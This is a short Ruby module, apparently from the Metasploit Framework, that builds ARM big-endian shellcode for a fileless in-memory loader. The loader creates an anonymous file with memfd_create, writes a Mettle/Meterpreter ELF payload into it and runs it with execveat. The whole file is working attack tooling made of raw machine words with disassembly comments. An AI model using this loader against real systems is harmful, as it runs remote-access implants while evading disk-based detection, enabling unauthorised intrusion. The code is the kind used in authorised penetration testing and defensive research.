
#
# In memory loader used to execute Mettle ELF file.
# Compatible with Kernel Linux >= 3.17 (where memfd_create is introduced)
# Author: Martin Sutovsky <martin_sutovsky[at]rapid7.com>
# Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
#
module Msf::Payload::Linux::Armbe::MeterpreterLoader
  def in_memory_load(payload)
      in_memory_loader = [
          0x0020a0e3, #0x1000:	mov	r2, #0	0x0020a0e3
          0x04202de5, #0x1004:	str	r2, [sp, #-4]!	0x04202de5
          0x0d00a0e1, #0x1008:	mov	r0, sp	0x0d00a0e1
          0x0110a0e3, #0x100c:	mov	r1, #1	0x0110a0e3
          0x8370a0e3, #0x1010:	mov	r7, #0x83	0x8370a0e3
          0xfe7087e2, #0x1014:	add	r7, r7, #0xfe	0xfe7087e2
          0x000000ef, #0x1018:	svc	#0	0x000000ef
          0x0030a0e1, #0x101c:	mov	r3, r0	0x0030a0e1
          0x0c0000ea, #0x1020:	b	#0x1058	0x0c0000ea
          0x0e10a0e1, #0x1024:	mov	r1, lr	0x0e10a0e1
          0x002091e5, #0x1028:	ldr	r2, [r1]	0x002091e5
          0x041081e2, #0x102c:	add	r1, r1, #4	0x041081e2
          0x0470a0e3, #0x1030:	mov	r7, #4	0x0470a0e3
          0x000000ef, #0x1034:	svc	#0	0x000000ef
          0x0300a0e1, #0x1038:	mov	r0, r3	0x0300a0e1
          0x0020a0e3, #0x103c:	mov	r2, #0	0x0020a0e3
          0x04202de5, #0x1040:	str	r2, [sp, #-4]!	0x04202de5
          0x0d10a0e1, #0x1044:	mov	r1, sp	0x0d10a0e1
          0x0030a0e3, #0x1048:	mov	r3, #0	0x0030a0e3
          0x014aa0e3, #0x104c:	mov	r4, #0x1000	0x014aa0e3
          0x837100e3, #0x1050:	movw	r7, #0x183	0x837100e3
          0x000000ef, #0x1054:	svc	#0	0x000000ef
          0xf1ffffeb, #0x1058:	bl	#0x1024	0xf1ffffeb

      ].pack('V*')
      in_memory_loader + [payload.length].pack('N*')
  end
end
